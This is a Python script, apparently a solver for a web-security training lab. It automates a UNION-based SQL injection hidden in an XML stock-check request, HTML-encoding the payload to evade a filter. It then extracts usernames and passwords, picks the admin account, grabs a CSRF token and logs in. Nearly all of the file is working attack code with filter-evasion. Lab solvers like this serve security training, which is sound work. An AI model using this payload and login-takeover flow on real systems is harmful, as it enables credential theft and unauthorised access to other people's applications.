from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/product/stock")

    payload = "4444 UNION SELECT username || ':' || password FROM users"
    print_info(f'HTML-encoding payload "{payload}"...')

    payload = "".join([f"&#{ord(char)};" for char in payload])
    print_success(f'HTML-encoded payload: "{payload}"\n')

    headers = {"Content-Type": "application/xml"}
    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{payload}</storeId></stockCheck>'

    print_info(
        f'Performing a UNION attack with the following POST request to "{url}":\n'
    )
    print(f"headers: {headers}")
    print(f"data: {data}\n")

    resp = requests.post(url, proxies=proxies, verify=False, headers=headers, data=data)
    print_success(f"Extracted the following credentials:\n{resp.text}")

    for credentials in resp.text.splitlines():
        username, password = credentials.split(":")
        if username.startswith("admin"):
            print()
            break
    else:
        print_fail("Unable to find admin credentials")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    data = {"csrf": csrf, "username": username, "password": password}
    print_info("Logging in with the following values:")
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")
